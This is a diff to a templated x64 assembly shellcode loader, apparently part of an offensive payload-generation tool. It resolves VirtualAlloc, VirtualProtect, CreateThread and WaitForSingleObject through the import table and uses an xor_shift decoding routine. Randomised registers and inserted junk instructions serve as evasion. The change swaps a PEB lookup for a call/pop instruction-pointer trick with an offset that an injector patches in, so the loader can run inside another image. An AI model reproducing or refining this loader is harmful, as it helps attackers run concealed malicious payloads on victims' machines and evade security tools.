@@ -10,6 +10,7 @@
 // [rsp+0x20] store address of VirtualProtect
 // [rsp+0x28] store address of CreateThread
 // [rsp+0x30] store address of WaitForSingleObject
+// 0x21082520 is a stub that will be replaced by injector
 
 entry:
 // ================================ prepare environment ================================
@@ -47,12 +48,10 @@ entry:
     push {{.Reg.rdx}}                                          {{igi}}
   {{end}}
 
-  // get pointer to the PEB
-  xor {{.Reg.rax}}, {{.Reg.rax}}                               {{igi}}
-  mov {{.Reg.rax}}, 0x60                                       {{igi}}
-  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]                          {{igi}}
-  // store image base address
-  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]                     {{igi}}
+  // calculate image base address
+  call get_rip
+  mov {{.RegN.rdi}}, {{.Reg.rax}}
+  sub {{.RegN.rdi}}, 0x21082520
 
   // read the LoadLibraryA/W form IAT
   mov {{.RegN.rbx}}, {{.RegN.rdi}}                             {{igi}}
@@ -228,12 +227,10 @@ entry:
   {{end}}
 
 {{else}}
-  // get pointer to the PEB
-  xor {{.Reg.rax}}, {{.Reg.rax}}                               {{igi}}
-  mov {{.Reg.rax}}, 0x60                                       {{igi}}
-  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]                          {{igi}}
-  // store image base address
-  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]                     {{igi}}
+  // calculate image base address
+  call get_rip
+  mov {{.RegN.rdi}}, {{.Reg.rax}}
+  sub {{.RegN.rdi}}, 0x21082520
   // get procedure address of VirtualAlloc
   mov {{.RegV.rcx}}, {{.RegN.rdi}}                             {{igi}}
   add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                     {{igi}}
@@ -478,6 +475,11 @@ entry:
   {{db .EndOfLoader}}
 
 // ====================================== function =======================================
+
+get_rip:
+  pop  {{.Reg.rax}}                                            {{igi}}
+  push {{.Reg.rax}}                                            {{igi}}
+  ret                                                          {{igi}}
 
 xor_shift:
   mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
